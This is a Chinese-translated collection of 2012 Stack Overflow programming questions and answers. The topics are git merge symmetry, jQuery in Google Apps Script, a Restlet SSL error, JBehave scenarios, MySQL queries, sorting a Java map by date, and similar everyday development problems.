这可能吗？如果可以，怎么做？

亲切的问候，西布伦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:10:48.043

Visual Studio 具有生成前和生成后事件。那些提供访问宏的也为您提供构建模式（ConfigurationName）。您可以在 pre-build 命令中更新 Python 配置文件。

类似的事情 `if $(ConfigurationName) == Debug` 是可能的。

在一些项目中，我将它与将 $(ConfigurationName) 作为参数的批处理/cmd 文件结合使用。

# git - Git中的合并是对称的吗？

> ID：12192526
> 
> 赞同：41
> 
> 时间：2012-08-30T08:08:13.013
> 
> 标签：git, merge, branching-and-merging, git-merge, symmetry

假设我们有两个分支（**B**和**C**）从一个共同的祖先**A**分歧。从**B**合并到**C会产生与从****C**合并到**B**相同的结果吗？

```
 A
  |
 / \
B   C 
```

澄清一下-我假设任何手动合并冲突解决方案都将在两个方向上发生。但是发生的任何自动合并会导致选择相同的代码吗？这就是我的假设，因为两个方向的提交日期都是相同的。

进一步澄清 - 我知道实际的合并会根据方向产生彼此的“镜像”。我只是在询问自动解决的冲突。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-08-30T13:39:32.543

默认合并的答案是肯定的。三路合并找到一个共同的祖先，然后应用双方的差异，这是一个不依赖于顺序的操作。合并排序和交换性的话题在[git list](http://thread.gmane.org/gmane.comp.version-control.git/107737/focus=107895)上引发了一场有趣的讨论（如果你喜欢那种东西，那就是）。注意`B into C`和应该是对称的，但对于vs`C into B`不一定是相同的。`(B into C) into A``B into (C into A)`

[编辑说明，2020 年 4 月：如果您添加类似`-X ours`or`-X theirs`的选项，答案将变为“否”，请参阅[twalberg 的答案](https://stackoverflow.com/a/12199160/1256452)和其他人以获取更多注意事项。]

* * *

更详细地说，根据下面文斯的评论和 seh 对问题的评论， 和 之间会有两个明显的区别`B into C`，`C into B`这两者都不会影响问题中引用的自动合并解决方案。

首先，历史会有所不同。合并提交的父级将根据合并顺序而改变。对于这些示例，我将使用“first_branch”和“second_branch”，因此我可以保留字母来表示提交。

```
git checkout first_branch && git merge second_branch

E <- merge commit
|\
| D <- second_branch's tip
| |
| C <- another commit on second_branch 
| |
| B <- and another
|/
A <- first_branch's tip before the merge 
```

在这种情况下，E 的“第一父”`E^1`是合并前 first_branch 的小费。second_branch 是合并提交的“第二个父级”，又名`E^2`. 现在考虑反过来：

```
git checkout second_branch && git merge first_branch

E <- merge commit
|\
| D <- first_branch's tip
| |
| C <- another commit on first_branch 
| |
| B <- and another
|/
A <- second_branch's tip before the merge 
```

父母反了。`E^1`是合并前 second_branch 的尖端。`E^2`是 first_branch 的尖端。

其次，冲突的显示顺序会颠倒。在第一种情况下，冲突可能如下所示：

```
<<<<<<< HEAD
This line was added from the first_branch branch.
=======
This line was added from the second_branch branch.
>>>>>>> second_branch 
```

在第二种情况下，相同的冲突如下所示：

```
<<<<<<< HEAD
This line was added from the second_branch branch.
=======
This line was added from the first_branch branch.
>>>>>>> first_branch 
```

这些差异都不会影响自动合并解析，但是当您反转三向合并顺序时，它们确实会出现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T14:26:09.627

这取决于您所说的“相同结果”是什么意思。从内容的角度来看，假设没有冲突，或者所有现有的冲突都以完全相同的方式精心解决，则生成的新合并提交的内容应该是相同的。

但是，从历史拓扑的角度来看，两者是非常不同的。如果您在分支 B 上并在 C 中合并，则 B 的 HEAD 将移动以指向合并提交，但 C 保持在原处。相反，如果您在 C 上并在 B 中合并，则 C 的 HEAD 移动，而 B 保持原位。所以最终的拓扑结构非常不同，这对任何一个分支的未来开发都有影响，即使新提交的内容在任何一种情况下都是相同的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:40:20.180

不，我认为它不会是对称的。首先，您可以设置合并策略选项，特别是在您的情况下`theirs`or`ours`确定是否选择 B 或 C。

在自动合并中，我认为例如，如果您要合并到您的远程分支，则远程分支优先于您的更改，因此这意味着`git merge C`从 B 调用将导致选择 C ​​更改。不过，我不是 100% 确定，所以您可以自己尝试并告诉我们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-18T10:33:46.970

内容是对称的，但是如果你使用 GitHub 或 Bitbucket 或者你最喜欢的本地 Git 查看器来查看合并时所做的更改，你会看到合并提交中列出的文件更改是不同的。（以及上面提到的其他事情。）

```
git checkout b
git merge c 
```

合并中显示的文件更改将是`c`自那时以来所做的更改`b`和`c`发散的更改。

```
git checkout c
git merge b 
```

合并中显示的文件更改将是`b`自那时以来所做的更改`b`和`c`发散的更改。

# asp.net - 从 .NET Windows 服务返回数据

> ID：12192529
> 
> 赞同：0
> 
> 时间：2012-08-30T08:08:25.890
> 
> 标签：asp.net, vb.net, windows-services

我已经创建了一个 Windows 服务项目来执行一些功能，然后我将它安装在 Windows 服务中。

我有一个调用该服务并等待服务停止的 ASP.NET 网站。

ASP.NET 网站只需启动服务并等待引发停止事件。

这是windows服务代码：

```
Protected Overrides Sub OnStart(ByVal args() As String)
    MyEventLogObj = New MyEventLog("Dive Report Service", "Dive Report Service")
    MyEventLogObj.WriteToEventLog("Dive Report Service Started")

    Dim ReportServiceArguments As ReportServiceArguments = ExtractArguments(args)

    If ReportServiceArguments Is Nothing Then
        MyEventLogObj.WriteToEventLog("Invalid Arguments")
    Else
        GenerateReport(ReportServiceArguments)
    End If

    Me.Stop()
End Sub 
```

一开始服务调用 GenerateReport() 函数，然后停止自身。

和 ASP.NET 代码

```
 Dim myController As New ServiceController("DiveReportService")
    Dim time As TimeSpan = TimeSpan.FromMinutes(2)
    myController.WaitForStatus(ServiceControllerStatus.Stopped, time) 
```

我想问一些问题，我可以让这个 Windows 服务将一些数据从它返回到 ASP.NET 应用程序

# jquery - 谷歌应用脚 本 HTML 服务和 jQuery

> ID：12192532
> 
> 赞同：2
> 
> 时间：2012-08-30T08:08:40.100
> 
> 标签：jquery, google-apps-script

我正在使用 GAS HTML 服务来创建界面并尝试使用 Javascript 来处理客户端操作。

HTML 服务和 Caja 不支持“this”吗？

在我的 HTML 文件中，我有这个：

```
<input type="button" name="RemoveSample_1" id="RemoveSample_1" value="Remove" onClick="removeSampleNow(this)" /> 
```

和一个简单的 Javascript 函数来测试：

```
<script>
  function removeSampleNow(thisObj) {

    alert(thisObj.id);

  }
</script> 
```

它可以在我的桌面上本地运行 html，但不能在 GAS 中运行。错误是“未定义”。

我们不能将参数传递给函数调用吗？那么我们如何基于一个选择/点击的按钮来驱动 HTML 元素操作呢？

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-20T17:00:12.183

我不同意@mzimmerman，您可以使用 onclick html 属性（尽管 Caja 会操纵它）。在回调函数中，您通过参数访问元素，而不是“this”。

我知道有两种工作方式。第一个是最简单的。在回调函数中，元素将是参数，而不是“this”。

```
<html>
  <head>
    <script>
      function onClickCallback(element){
        console.log('element.id ' + element.id);
        element.value = 'Clicked!';
      }
    </script>
  </head>
  <body>
      <input type="button" name="b1" id="b1" value="Click me" onclick='onClickCallback(this)' />
  </body>
</html> 
```

第二种方式利用 JQuery 的强大功能在运行时动态绑定回调函数，在这种情况下，回调函数确实通过 'this' 访问元素（并且函数不需要参数）。虽然第二个示例不是必需的（第一个解决方案可以正常工作），但我将其包括在内，因为您会发现 JQuery 之类的库为您提供了很多。

```
<html>
  <head>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script>
      // like onload but doesn't wait for images, only the dom
      $(document).ready(function() {
        // bind the click handler at run time
        $('#b1').click(onClickCallback);
      });

      function onClickCallback(){
        console.log('this.id ' + this.id);
        this.value = 'Clicked!';
      }
    </script>
  </head>
  <body>
      <input type="button" name="b1" id="b1" value="Click me" />
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T11:36:58.973

您不能在 html 部分中使用 on click 属性。请参阅[Caja](https://developers.google.com/apps-script/html_service#Caja)限制。

有关如何执行此操作的示例，请参阅“动态添加脚本或外部 CSS”。

```
<script>
function doSomething() { alert('but this is fine!'); }
document.write('<input type="button" id="button1">')
document.getElementById('button1').onclick = doSomething;
</script> 
```

# javascript - 如何更改我的网格

> ID：12192535
> 
> 赞同：2
> 
> 时间：2012-08-30T08:08:53.497
> 
> 标签：javascript, jquery

我目前正在为我的拼写游戏在 JQuery 中动态生成一个网格。目前网格是 6x6，因为它只处理 3 个字母的单词。

问题是我需要能够更改行数和列数以供将来开发（添加更大的单词等）。

理想情况下，我希望能够更改 HTML 中的行和列，以便经验不足的同事可以在我不在时更改其大小。

我一直在寻找表单以获取 HTML 中的数据并将其传递给 JQuery，但我不确定我是否知道如何使用我用来创建网格的 JQuery 来完成它，因为我正在创建它我存储在正文列表中的单词。

有人能指出我正确的方向吗？

这是生成网格的脚本...

```
var listOfWords = [];
var rndWord = [];
var counter = 0;
var ul = document.getElementById("wordlist");
var i;

for (i = 0; i < ul.children.length; ++i) {

    listOfWords.push({
        "name": ul.children[i].getAttribute("data-word"),
        "pic": ul.children[i].getAttribute("data-pic"),
        "audio": ul.children[i].getAttribute("data-audio")
     });
}

var chosenWords = [];
var copylist = listOfWords.slice();

for (var x = 0; x < 6; x++) {
    var rand = Math.floor(Math.random() * (copylist.length));
    chosenWords.push(copylist[rand].name);
    copylist.splice(rand, 1);
    if (chosenWords.length < 12) {
        chosenWords.push('   ');
     }

 }

var shuffledWords = [];
shuffledWords = chosenWords.sort(function() {
    return 0.5 - Math.random()
});

 var guesses = {};
var tbl = document.createElement('table');
tbl.className = 'tablestyle';
var wordsPerRow = 2;

for (var i = 0; i < shuffledWords.length - 1; i += wordsPerRow) {

    var row = document.createElement('tr');
    for (var j = i; j < i + wordsPerRow; ++j) {
        var word = shuffledWords[j];
        guesses[word] = [];

        for (var k = 0; k < word.length; ++k) {
            var cell = document.createElement('td');

            $(cell).addClass('drop-box').attr('data-word', word).attr('data-letter', word[k]);
            cell.textContent = word[k];

            row.appendChild(cell);
        }
    }

    tbl.appendChild(row);
}

$(".container").append(tbl); 
```

我像这样存储单词和附加的声音和图片......

```
 <li data-word="mum" data-audio="http://www.wav-sounds.com/cartoon/porkypig2.wav" data-pic="http://www.clker.com/cliparts/5/e/7/f/1195445022768793934Gerald_G_Lady_Face_Cartoon_1.svg.med.png"></li>

    <li data-word="cat" data-audio="http://www.wav-sounds.com/cartoon/bugsbunny2.wav" data-pic="http://www.clker.com/cliparts/c/9/9/5/119543969236915703Gerald_G_Cartoon_Cat_Face.svg.med.png"></li>

    <li data-word="dog" data-audio="http://www.wav-sounds.com/cartoon/daffyduck1.wav" data-pic="http://www.clker.com/cliparts/a/2/c/0/1195440948271207911zeimusu_spotty_dog.svg.med.png"></li>

    <li data-word="bug" data-audio="http://www.wav-sounds.com/cartoon/daffyduck2.wav" data-pic="http://www.clker.com/cliparts/4/b/4/2/1216180545881311858laurent_scarabe.svg.med.png"></li>

    <li data-word="rat" data-audio="http://www.wav-sounds.com/cartoon/bugsbunny1.wav" data-pic="http://www.clker.com/cliparts/C/j/X/e/k/D/mouse-md.png"></li>

    <li data-word="dad" data-audio="http://www.wav-sounds.com/cartoon/porkypig1.wav" data-pic="http://www.clker.com/cliparts/3/a/6/6/119544474191128182Gerald_G_Man_Face_6_-_World_Label.svg.med.png"></li> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T13:37:16.013

如果您的单词列表都是 3 个字符长，那么您可以生成 3x3、6x6、9x9 等，这是一种限制。如果列表中单词的字符数不同，那么您可以确保在每一行中，随机选择的单词加起来等于网格大小。例如，对于一个 10x10 的网格，我们随机选择一个长度 <=10。假设它是 5。下一个单词可能是两到五个字符长，等等。您应该根据单词的长度和另一个散列将单词存储在字典/散列中，以便知道该单词是否已被使用。

# android - java.security.NoSuchAlgorithmException：未找到 TrustManagerFactory SunX509 实现

> ID：12192536
> 
> 赞同：1
> 
> 时间：2012-08-30T08:08:56.260
> 
> 标签：android, restlet, restlet-2.0

我刚刚从以前的 rc5 更新到 restlet rc6。android 应用程序对外部 url 进行简单的 https 调用。

在 rc5 中一切正常，在 rc6 中我现在收到以下错误：

```
08-30 10:03:39.185: WARN/System.err(15077): Error while handling an HTTP client call
08-30 10:03:39.185: WARN/System.err(15077): [ 08-30 10:03:39.185 15077:0x3aff W/System.err ]
        java.lang.RuntimeException: Unable to create SSLContext.
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.ext.net.internal.HttpUrlConnectionCall.<init>(HttpUrlConnectionCall.java:130)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.ext.net.HttpClientHelper.create(HttpClientHelper.java:156)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.engine.adapter.ClientAdapter.toSpecific(ClientAdapter.java:160)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.engine.adapter.HttpClientHelper.handle(HttpClientHelper.java:111)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.Client.handle(Client.java:180)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.routing.Filter.doHandle(Filter.java:159)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.routing.Filter.handle(Filter.java:206)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.handle(ClientResource.java:1137)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.handleOutbound(ClientResource.java:1226)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.handle(ClientResource.java:1069)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.handle(ClientResource.java:1045)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.handle(ClientResource.java:951)
08-30 10:03:39.185: WARN/System.err(15077): at org.restlet.resource.ClientResource.get(ClientResource.java:658)
08-30 10:03:39.185: WARN/System.err(15077): at de.ewe.tk.apps.android.css.services.DocstoreService.getDocumentInfos(DocstoreService.java:86)
08-30 10:03:39.195: WARN/System.err(15077): at de.ewe.tk.apps.android.css.activity.DocstoreListActivity$GetDocumentInfosTask.doInBackground(DocstoreListActivity.java:66)
08-30 10:03:39.195: WARN/System.err(15077): at de.ewe.tk.apps.android.css.activity.DocstoreListActivity$GetDocumentInfosTask.doInBackground(DocstoreListActivity.java:46)
08-30 10:03:39.195: WARN/System.err(15077): at android.os.AsyncTask$2.call(AsyncTask.java:185)
08-30 10:03:39.195: WARN/System.err(15077): at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
08-30 10:03:39.195: WARN/System.err(15077): at java.util.concurrent.FutureTask.run(FutureTask.java:137)
08-30 10:03:39.195: WARN/System.err(15077): at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
08-30 10:03:39.195: WARN/System.err(15077): at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
08-30 10:03:39.195: WARN/System.err(15077): at java.lang.Thread.run(Thread.java:1102)
08-30 10:03:39.195: WARN/System.err(15077): Caused by: java.security.NoSuchAlgorithmException: TrustManagerFactory SunX509 implementation not found
08-30 10:03:39.195: WARN/System.err(15077): at org.apache.harmony.security.fortress.Engine.getInstance(Engine.java:105)
08-30 10:03:39.195: WARN/System.err(15077): at javax.net.ssl.TrustManagerFactory.getInstance(TrustManagerFactory.java:80)
08-30 10:03:39.195: WARN/System.err(15077): at org.restlet.ext.ssl.DefaultSslContextFactory.createSslContext(DefaultSslContextFactory.java:357)
08-30 10:03:39.195: WARN/System.err(15077): at org.restlet.ext.net.internal.HttpUrlConnectionCall.<init>(HttpUrlConnectionCall.java:126)
08-30 10:03:39.195: WARN/System.err(15077): ... 21 more 
```

谁能告诉我 rc6 中发生了什么变化使其不再工作？

rc6 的发行说明说：

```
The support for HTTPS has been significantly completed and fixed in all connectors for :

cipher suites restriction
SSL/TLS protocol version restriction
client certificate request & requirement setting 
```

不幸的是，我在官方文档中没有找到任何提示，我的代码需要更改哪些内容才能让它再次工作。

谢谢，蒂洛

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:33:15.800

愚蠢的兔子`DefaultSslContextFactory.createSslContext(..)`显然在 rc6 的方法中包含以下内容：

```
setKeyManagerAlgorithm(helperParameters.getFirstValue(
            "keyManagerAlgorithm", true, System.getProperty(
                    "ssl.KeyManagerFactory.algorithm", "SunX509"))); 
```

即，他们对 Sun JDK 专有的 SunX509 进行了硬编码——总体而言，这是一个非常糟糕的主意。`025d356d9fc3620ba9ed613fed32f1a5668f4f70`这已在17 天前的 commit 中修复。

如果您*现在*需要它来工作，您当然可以尝试自己下载和构建库。

# jbehave - 如何让 JBehave 忽略失败的场景？

> ID：12192539
> 
> 赞同：0
> 
> 时间：2012-08-30T08:09:18.610
> 
> 标签：jbehave

```
Scenario A:
Step A - PENDING
Step B - PENDING

Scenario B:
Step C - Implemented
Step D - Implemented 
```

运行故事时，步骤 C 和 D 设置为 NOT PERFORMED。即使方案 A 由于未决步骤而失败，我如何让它们运行？

我尝试将 PendingStepStrategy 设置为 PassingUponPendingStep（和 FailingUponPendingStep），但它没有任何区别。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-19T14:05:42.040

JBehave 可以配置为跟踪场景之间的状态。我相信这样做的原因是考虑到您何时想要拥有彼此相关的场景。

如果您检查您使用的配置，那么您应该能够查看您是否在 StoryControls 集上有某个参数。

例如

```
Configuration configuration = new MostUsefulConfiguration()
    .useStoryControls(new StoryControls().doResetStateBeforeScenario(false))
... 
```

如果你有上面的设置，它不会执行其他场景，因为失败状态被保留

您可以在配置中使用 JBehaves MostUsefulConfiguration 类而无需额外配置，因为 doResetStateBeforeScenario 默认设置为 true。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:58:12.403

这些步骤无论如何都应该运行。我认为您在声明场景的行中可能有错误，而 JBehave 认为这四个步骤属于同一场景。

场景由令牌**Scenario:**分隔，例如

```
Scenario: Use a pattern variant
When the item cost is 10.0
When the price is 10.0
When the cost is 10.0

Scenario: Use a aliases variant
Then the item price is 10.0
Then the item price becomes 10.0
Then the item price equals to 10.0 
```

即使第一个场景中的任何步骤失败，第二个场景也会运行。

# image - 如何从表单中的图像中提取图像？

> ID：12192543
> 
> 赞同：1
> 
> 时间：2012-08-30T08:09:40.603
> 
> 标签：image, vb6, jpeg, immediate-window

我有一个旧的 VB6 项目，它有一个包含许多`Image`对象的表单。这就是作者存储图像以在其他表单上的按钮等上使用的方式。

如何将这些对象中的图像提取为类似 a`JPG`或的东西`BMP`？

我希望能把东西放进`Immediate`窗户里。我不介意一件一件地做。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T23:56:30.007

```
SavePicture MyImage.Picture, "mypic.bmp" 
```

# eclipse - eclipse for android c source code - 如何解析编译器头文件？

> ID：12192561
> 
> 赞同：0
> 
> 时间：2012-08-30T08:10:48.977
> 
> 标签：eclipse, eclipse-cdt, android-source, pandaboard

我现在正在使用 eclipse 在带有熊猫板的 C 代码中在 android 平台上开发驱动程序和守护程序，并且我想使用 eclipse 和 CDT 作为编辑和浏览工具。

我已将 android 源代码作为 makefile 项目导入到 eclipse 中，并使用索引器进行处理。

我的问题是，因为有很多用于不同架构（x86、arm 等）的头文件，比如等等。Eclipse 报告了一个错误，比如“未解决的包含 xxx”，因为这些文件的候选者太多。如果我像 makefile 选项一样指定变量或标识符来通知 eclipse，eclipse 可以分析 makefile 并选择正确的路径（如编译器）吗？

任何人都可以帮助我吗？

谢谢，

-云飞

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:18:07.130

对于您的驱动程序检查： [http ://wiki.eclipse.org/HowTo_use_the_CDT_to_navigate_Linux_kernel_source](http://wiki.eclipse.org/HowTo_use_the_CDT_to_navigate_Linux_kernel_source)

通常，在使用 Makefile 项目时，您需要帮助 Eclipse，以便它知道在哪里可以找到包含以及定义了哪些预处理器符号。

右键单击您的项目。选择属性 -> C/C++ 常规 -> 路径和符号。添加最重要的包含路径，索引器结果会变得更好。

# visual-studio - 无法使用 dummy-project-with-refrences 技巧在 VS2012 中使用 Community Build Extensions 打开 TFS 构建过程模板

> ID：12192565
> 
> 赞同：5
> 
> 时间：2012-08-30T08:11:11.130
> 
> 标签：visual-studio, xaml, tfs, visual-studio-2012, tfsbuild

我正在尝试打开一个 TFS 构建过程模板 ( `DefaultTemplate.11.1.xaml`) 文件，其中包含来自[Community TFS Build Extensions](http://tfsbuildextensions.codeplex.com/)的活动。我正在按照[这里](http://tfsbuildextensions.codeplex.com/wikipage?title=How%20to%20integrate%20the%20extensions%20into%20a%20build%20template&referringTitle=Documentation)的说明，*将自定义活动放入 Visual Studio*部分。我在 Visual Studio 2012 的 RC 版本中对此没有任何问题，但现在，在升级到发布版本后，尝试打开文件最终会出现错误：

> System.Xaml.XamlException：“无法解析属性“BuildSettings”的类型“InArgument(mtbwa:BuildSettings)”。

TFS 本身在运行基于此模板的构建时似乎没有任何问题。

我可以在没有技巧的情况下打开文件，但是自定义活动当然没有正确显示。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-02T16:03:33.693

看一下这个：

[http://blogs.blackmarble.co.uk/blogs/rfennell/post/2012/08/30/Type-InArgument(mtbwaBuildSettings)-of-property-BuildSettings-errors-in-TFS-2012-RTM-builds.aspx](http://blogs.blackmarble.co.uk/blogs/rfennell/post/2012/08/30/Type-InArgument(mtbwaBuildSettings)-of-property-BuildSettings-errors-in-TFS-2012-RTM-builds.aspx)

引用：

“如果您用来管理流程模板编辑的 Visual Studio 类库项目面向 .NET 4.5，则它必须是 4.0。对于 Visual Studio 2012 RTM，情况不再如此，事实上，情况正好相反。”

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T15:27:08.550

我真的不认为这是一个很好的答案，但我没有足够的代表发表评论......

1.  xaml 文件的构建操作设置为无？

2.  在 VS 2012 RTM 中打开构建模板时我遇到了类似的问题，但我能够“稍微”打开 xaml，这意味着我可以在工作流设计器中打开它，但其中很多只是错误活动。我发现了一些错误，大意是我应该添加以前不需要的引用（在 VS 2010 或 VS 11 中都没有），例如 PresentationCore 和 PresentationFramework。我希望我能记住更多细节，以便在这一点上传递给你。

# design-patterns - 这是适配器模式的适当用途吗？

> ID：12192567
> 
> 赞同：1
> 
> 时间：2012-08-30T08:11:22.973
> 
> 标签：design-patterns, adapter

我在系统中有两个实体的表示。

表示 A 在整个系统中用作现代的首选实现。

表示 B 用于满足遗留系统中的怪癖。

我希望在持久化实体时发生从 A 到 B 的翻译。

我可以为此使用什么实现模式？

实现一个封装翻译功能的“适配器”可能是正确的吗？还是有更好的术语/方式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:56:53.467

您可能希望将适配器与工厂结合起来，或者只是通过普通继承。

从首选实现中提取接口 A，然后实现一个包装类。

```
public interface A {
  <methods>
}

public class PreferredImplementation implements A {
  <methods>
}

public class AdaptorForOldClass implements A {
  private final OldClass wrapped;

  public AdaptorForOldClass(final OldClass toWrap) {
    this.wrapped = toWrap;
  }

  <methods>
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T11:15:30.970

我认为您的要求是仅在持久化 A 类到 B 类时才将其映射。为此，我认为您可以只使用数据传输对象，然后您的持久层可以执行从该 DTO 到 B 类的映射。我真的看不到适配器设计模式的使用，除非您有比您有更多的要求表示。

# mysql - 在 WHERE 子句中将列与自身进行比较

> ID：12192574
> 
> 赞同：1
> 
> 时间：2012-08-30T08:11:51.877
> 
> 标签：mysql

这是我的问题。

我有两张桌子，

表格1 -

```
id | Name | Code
1  | test | 4
2  | test | 5
3  | test4| 6
4  | test4| 7
5  | test | 8
6  | test | 9 
```

表 2 -

```
id | Code
1  | 4
2  | 5
3  | 6
4  | 7
5  | 8
6  | 9 
```

这里的**代码**列在两个表中是相同的，我正在尝试的是，我有来自 Table2 的**代码**，并且我正在选择另一个表。例如

`SELECT * FROM Table2 LEFT JOIN Table1.Code = Table2.Code WHERE Table2.Code = 4`，没关系，现在我从两个表中获取相同代码的结果，但是现在，当我拥有 Table1 时，我想获取 All the rows With the same **Name**。我想要的预期结果是

```
id | Name | Code
1  | test | 4
2  | test | 5
5  | test | 8
6  | test | 9 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:15:24.420

你可以尝试类似的东西

```
SELECT  *
FROm    Table1 t1
WHERE   Name IN (
                    SELECT  t1.Name
                    FROM    Table1 t1 INNER JOIN
                            (
                                SELECT  id,
                                        Code
                                FROM    Table2 
                                WHERE   Table2.Code = 4
                            ) t2    ON  t1.id = t2.id
                                    AND t1.Code = t2.Code
                ) 
```

甚至

```
SELECT  *
FROm    Table1 t1
WHERE   Name IN (
                    SELECT  t1.Name
                    FROM    Table2 t2 INNER JOIN
                            Table1 t1   ON  t2.id = t1.id
                                        AND t2.Code = t1.Code
                    WHERE   Table2.Code = 4
                ) 
```

# java - 如何在地图中对日期进行排序 在具有其他价值的java中

> ID：12192580
> 
> 赞同：0
> 
> 时间：2012-08-30T08:12:14.237
> 
> 标签：java, map

> **可能重复：**
> [如何对 Java 中的值对 Map<Key, Value> 进行排序？](https://stackoverflow.com/questions/109383/how-to-sort-a-mapkey-value-on-the-values-in-java)

我在 java 中有一张带有`Map<String, String>`.Map contaions的地图`<Id, Date>`。我想根据日期对这些地图进行排序。我怎样才能做到这一点？这是打印后的地图

```
-------------------------------------
PTRRRRRR     08-20-2011
-------------------------------------
TESTDESC     08-01-2012
-------------------------------------
TESTMYO      12-29-2011
-------------------------------------
TESTTEST     08-01-2012
-------------------------------------
TESTPROL     08-01-2012
-------------------------------------
TESTPRO      08-01-2012
-------------------------------------
PNAMELQ      08-02-2012
-------------------------------------
TESTMYO      12-29-2011
------------------------------------ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:18:27.807

您可以像这样使用自定义比较器。

```
String data = "PTRRRRRR     08-20-2011\n" +
        "TESTDESC     08-01-2012\n" +
        "TESTMYO      12-29-2011\n" +
        "TESTTEST     08-01-2012\n" +
        "TESTPROL     08-01-2012\n" +
        "TESTPRO      08-01-2012\n" +
        "TESTPRO      08-01-2012\n" +
        "PNAMELQ      08-02-2012\n" +
        "TESTMYO      12-29-2011\n";
Map<String, String> map = new LinkedHashMap<String, String>();
for (String line : data.split("\n")) {
    String[] keyValue = line.split(" +");
    map.put(keyValue[0], keyValue[1]);
}
Map.Entry<String, String>[] entries = map.entrySet().toArray(new Map.Entry[map.size()]);
Arrays.sort(entries, new Comparator<Map.Entry<String, String>>() {
    SimpleDateFormat date = new SimpleDateFormat("MM-dd-yyyy");

    @Override
    public int compare(Map.Entry<String, String> o1, Map.Entry<String, String> o2) {
        try {
            return date.parse(o1.getValue()).compareTo(date.parse(o2.getValue());
        } catch (ParseException e) {
            throw new AssertionError(e);
        }
    }
});
for (Map.Entry entry : entries) {
    System.out.println(entry);
} 
```

印刷

```
PTRRRRRR=08-20-2011
TESTMYO=12-29-2011
TESTDESC=08-01-2012
TESTTEST=08-01-2012
TESTPROL=08-01-2012
TESTPRO=08-01-2012
PNAMELQ=08-02-2012 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:29:18.620

首先检查[http://docs.oracle.com/javase/6/docs/api/java/util/Map.html](http://docs.oracle.com/javase/6/docs/api/java/util/Map.html)并注意，有不同的`Map`实现：

> 地图的顺序定义为地图集合视图上的迭代器返回其元素的顺序。一些地图实现，如 TreeMap 类，对它们的顺序做出特定的保证；其他的，比如 HashMap 类，不这样做。

在[http://docs.oracle.com/javase/6/docs/api/java/util/TreeMap.html](http://docs.oracle.com/javase/6/docs/api/java/util/TreeMap.html)你会发现这个定义：

> **地图根据其键**的自然顺序或在地图创建时提供的 Comparator 进行排序，具体取决于使用的构造函数。

由于要按值比较 ( `Map<String, Date>`)，因此需要实现`Comparator`按值比较的 a（未经测试）：

```
class ValueComparator implements Comparator<String> {

    Map<String, Date> map;
    public ValueComparator(Map<String, Date> map) {
        this.map = map;
    }

    public int compare(String a, String b) {
        return map.get(a).compareTo(map.get(b));
    }
} 
```

（您可能希望构建更通用的 ValueComparator。）

最后构建地图

```
Map<String, Date> sorted = new TreeMap<String, Date>(new ValueComparator(unsortedMap));
sorted.putAll(unsortedMap); 
```

# riak - riak 和 map reduce - 如何有效地使用键进行分组

> ID：12192581
> 
> 赞同：2
> 
> 时间：2012-08-30T08:12:15.620
> 
> 标签：riak

我有一个看起来像这样的桶。它们的密钥是部分 uuid，作为随机部分，带有 YYYYMMDD 中的日期和附加的国家/地区。

如何执行将执行以下操作的有效查询：

```
select dt, country, camp, sum(count) as count from bucket where dt>'2012-10-03' and dt<'2012-10-05' group by dt,camp,country 

uiid201203US {'dt':'2012-10-03','camp':'a', 'country':'US', 'count':5}
uiid201204US {'dt':'2012-10-04','camp':'a', 'country':'US', 'count':5}
uiid201205US {'dt':'2012-10-05','camp':'a', 'country':'US', 'count':5}
uiid201203JP {'dt':'2012-10-03','camp':'a', 'country':'JP', 'count':5}
uiid201204JP {'dt':'2012-10-04','camp':'a', 'country':'JP', 'count':5}
uiid201205JP {'dt':'2012-10-05','camp':'a', 'country':'JP', 'count':5} 
```

# iphone - 在 NSDictionary 中查找键的存在

> ID：12192584
> 
> 赞同：1
> 
> 时间：2012-08-30T08:12:26.170
> 
> 标签：iphone, objective-c, nsdictionary, nsmutabledictionary

我们如何识别对象是否可用于特定键。我试过以下：

```
for(NSDictionary *item in jsonArray){
if([item objectForKey:@"EventDate"])
        NSLog([item objectForKey:@"EventDate"]);
} 
```

这使代码崩溃并出现错误：

```
 -[__NSCFString objectForKey:]: unrecognized selector sent to instance 0x6a567b0 
```

